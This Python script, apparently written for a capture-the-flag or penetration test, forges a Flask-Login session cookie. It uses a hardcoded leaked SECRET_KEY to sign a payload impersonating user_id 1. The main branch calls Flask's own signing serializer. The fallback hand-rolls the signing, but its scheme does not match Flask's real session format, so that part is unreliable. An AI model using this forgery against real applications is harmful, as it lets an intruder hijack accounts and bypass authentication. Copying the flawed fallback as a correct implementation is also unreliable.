import sys
import os

# Workaround for Flask installation issues - manually implement session signing
import hashlib
import hmac
import base64
import json
from datetime import datetime

try:
    # Try Flask first
    from flask import Flask
    import uuid
    
    # Create Flask app with leaked SECRET_KEY
    app = Flask(__name__)
    app.config['SECRET_KEY'] = 'G7x7pMBBduHU0HH5avEQ'
    
    # Create session payload for Flask-Login authentication
    session_payload = {
        '_fresh': True,
        '_id': str(uuid.uuid4()),
        'user_id': 1,
        '_user_id': 1
    }
    
    # Get Flask's signing serializer (this is what Flask uses internally)
    serializer = app.session_interface.get_signing_serializer(app)
    
    # Generate the forged session cookie using Flask's secure serialization
    forged_cookie = serializer.dumps(session_payload)
    
    print(f"Generated forged session cookie:")
    print(forged_cookie)
    print(f"\nSession payload structure: {session_payload}")
    
except ImportError:
    # Fallback: manually implement Flask-style session signing
    print("Flask not available, using manual implementation...")
    
    def base64_encode_urlsafe(data):
        """Base64 encode with URL-safe characters"""
        return base64.b64encode(data, b'-_').decode('ascii').rstrip('=')
    
    def base64_decode_urlsafe(data):
        """Base64 decode URL-safe format"""
        data = data.encode('ascii')
        missing_padding = 4 - len(data) % 4
        if missing_padding != 4:
            data += b'=' * missing_padding
        return base64.b64decode(data, b'-_')
    
    def sign_data(SECRET_KEY, data):
        """Sign data using HMAC-SHA256 (Flask style)"""
        key = SECRET_KEY.encode('utf-8')
        sig = hmac.new(key, data, hashlib.sha256).digest()
        return base64_encode_urlsafe(sig)
    
    # Create session payload
    session_payload = {
        '_fresh': True,
        '_id': 'de5a0e0e-98a7-48d3-9e5a-0a8b9c7d6e5f',
        'user_id': 1,
        '_user_id': 1
    }
    
    # Serialize to JSON
    session_json = json.dumps(session_payload, separators=(',', ':')).encode('utf-8')
    
    # Base64 encode payload
    payload_encoded = base64_encode_urlsafe(session_json)
    
    # Sign the payload
    signature = sign_data('G7x7pMBBduHU0HH5avEQ', payload_encoded.encode('ascii'))
    
    # Combine payload.signature (Flask format)
    forged_cookie = f"{payload_encoded}.{signature}"
    
    print("Generated forged session cookie (manual):")
    print(forged_cookie)
    print(f"\nPayload structure: {session_payload}")
